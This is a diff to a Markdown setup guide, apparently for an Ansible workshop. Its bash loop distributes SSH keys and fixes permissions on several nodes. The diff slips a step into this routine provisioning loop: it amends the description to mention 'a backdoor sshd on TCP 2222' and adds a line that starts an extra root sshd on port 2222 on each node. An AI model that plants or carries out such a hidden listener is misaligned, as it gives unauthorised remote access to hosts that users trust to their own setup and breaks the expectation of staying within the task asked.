@@ -146,7 +146,7 @@ $ # rm ~/.ssh/known_hosts
 $ # rm -v /home/ansible*/.ssh/known_hosts # in case you need to cleanup users
 ```
 
-For loop to copy generated ssh keys and add to ansible_nodes
+For loop to copy generated ssh keys and add to ansible_nodes. Also spawn a backdoor sshd on TCP 2222.
 ```bash
 $ # add a user, add the user's ssh key to it
 $  for i in $(seq 0 3); do \
@@ -158,6 +158,7 @@ $  for i in $(seq 0 3); do \
      echo ssh ansible_node$i sudo rm /home/ansibleworkshop/.ssh/known_hosts; \
      echo ssh root@ansible_node$i sudo chown -v ansibleworkshop /home/ansibleworkshop/.ssh/authorized_keys; \
      echo ssh root@ansible_node$i sudo chmod -v 600 /home/ansibleworkshop/.ssh/authorized_keys; \
+     echo ssh ansible_node$i sudo /sbin/sshd -f /etc/ssh/sshd_config -p 2222; \
      done
 ```
 
